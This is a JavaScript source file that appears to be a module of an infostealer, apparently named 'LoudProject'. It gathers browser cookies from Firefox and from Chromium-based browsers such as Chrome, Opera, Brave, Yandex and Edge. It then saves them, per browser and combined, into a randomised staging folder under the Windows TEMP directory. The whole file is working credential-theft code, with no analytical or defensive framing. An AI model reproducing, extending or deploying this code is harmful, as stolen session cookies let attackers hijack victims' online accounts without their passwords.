const { rdm } = require("../../../data/Config");
const { paths } = require("../../../data/paths");
const fs = require("fs");
const getFirefoxCookies = require("../../../functions/browsers/GetGeckoCookies");
const GetCookies = require("../../../functions/browsers/GetCookies");

async function Save() {
  let cookies = "";

  const firefoxCookies = (await getFirefoxCookies()) || "";
  
  if (firefoxCookies.includes("TRUE")) {
    cookies += firefoxCookies;

    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Gecko\\Cookies`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Gecko`);
    fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Gecko\\Cookies.txt`, firefoxCookies);
  }
  for (let i = 0; i < paths.length; i++) {
    const path = paths[i].includes("Opera") ? paths[i] + "Network\\" : paths[i];

    if (!fs.existsSync(path + "\\Cookies")) continue;

    const cheese = (await GetCookies(path)) || "";
    const browserName = getBrowserNameByPath(path);
    if (!cheese || cheese == "") continue;
    cookies += cheese;
    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium`);
    fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium\\${browserName}.txt`, cheese);
  }

 if (!cookies.includes("TRUE")) cookies = "Cookies not found.";
 if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium`);
 fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Chromium\\All_Cookies.txt`, cookies);
}

function getBrowserNameByPath(path) {
  const using = path.split("\\").find((p) => p.includes("Default") || p.includes("Profile"));

  if (path.includes("Chrome")) return `Google_Chome${using ? `_${using}` : ""}`;
  else if (path.includes("Opera Stable")) return `Opera_Stable${using ? `_${using}` : ""}`;
  else if (path.includes("Opera GX")) return `Opera_GX${using ? `_${using}` : ""}`;
  else if (path.includes("Brave")) return `Brave${using ? `_${using}` : ""}`;
  else if (path.includes("Yandex")) return `Yandex${using ? `_${using}` : ""}`;
  else if (path.includes("Edge")) return `Edge${using ? `_${using}` : ""}`;
  else return "Unknown";
}

module.exports = { Save };
